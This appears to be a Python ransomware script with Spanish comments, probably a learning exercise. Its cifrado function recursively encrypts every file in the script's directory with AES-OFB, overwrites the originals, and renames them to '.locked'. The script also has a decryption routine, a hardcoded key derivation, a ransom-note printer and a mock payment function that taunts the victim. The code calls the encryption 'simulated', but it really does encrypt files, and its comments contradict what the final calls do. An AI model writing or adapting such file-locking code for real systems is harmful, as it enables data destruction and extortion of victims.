import os
import hashlib
from Crypto.Cipher import AES
import requests

# Función para obtener el hash de un valor
def get_hash(x):
    h = hashlib.sha256()
    h.update(x)
    return h.digest()

# Función para obtener la clave de encriptación
def getkey(P=898748489219550865658271593094209, private=85047):
    public = int("355449923410341272813355750637267")
    kb = pow(public, private) % P
    k = b'' + bytes(str(kb), 'utf-8')
    return k

# Directorio donde se encuentra el script actual
script_directory = os.path.dirname(os.path.abspath(__file__))
directory_to_encrypt = script_directory

# Nombre del script actual
script_name = os.path.basename(__file__)

# Función para simular la encriptación
def cifrado(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == script_name:
                print(f"Omitiendo el archivo del script: {file}")
                continue

            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                
                e = AES.new(key[:32], AES.MODE_OFB)
                ciphertext = e.encrypt(file_data)
                
                with open(file_path, "wb") as f:
                    f.write(e.iv)
                    f.write(get_hash(file_data))
                    f.write(ciphertext)
                
                new_file_path = file_path + ".locked"
                os.rename(file_path, new_file_path)
                print(f"Archivo {file} simulado como encriptado (renombrado a {new_file_path})")
            except PermissionError:
                print(f"No se tiene permiso para encriptar {file_path}. Saltando este archivo.")
            except Exception as e:
                print(f"Error encriptando {file_path}: {e}")

# Función para simular la desencriptación
def descifrado(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == script_name:
                print(f"Omitiendo el archivo del script: {file}")
                continue

            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    iv, sig, ciphertext = [f.read(x) for x in (16, 32, -1)]
                
                e = AES.new(key[:32], AES.MODE_OFB, iv)
                plaintext = e.decrypt(ciphertext)
                
                with open(file_path, "wb") as f:
                    f.write(plaintext)
                
                new_file_path = file_path.replace(".locked", "")
                os.rename(file_path, new_file_path)
                print(f"Archivo {file} simulado como desencriptado (renombrado a {new_file_path})")
            except PermissionError:
                print(f"No se tiene permiso para desencriptar {file_path}. Saltando este archivo.")
            except Exception as e:
                print(f"Error desencriptando {file_path}: {e}")

# Función para mostrar el mensaje de rescate
def display_ransom_note():
    ransom_note = """
    Te los desencripte :3
    """
    print(ransom_note)

# Función para simular el pago (no hace nada realmente)
def pagar(platita):
    print("Gracias por el dinero pero no te devolveremos nada XD")

key = getkey()

# Simular la encriptación de archivos
descifrado(directory_to_encrypt, key)

# Mostrar el mensaje de rescate
display_ransom_note()
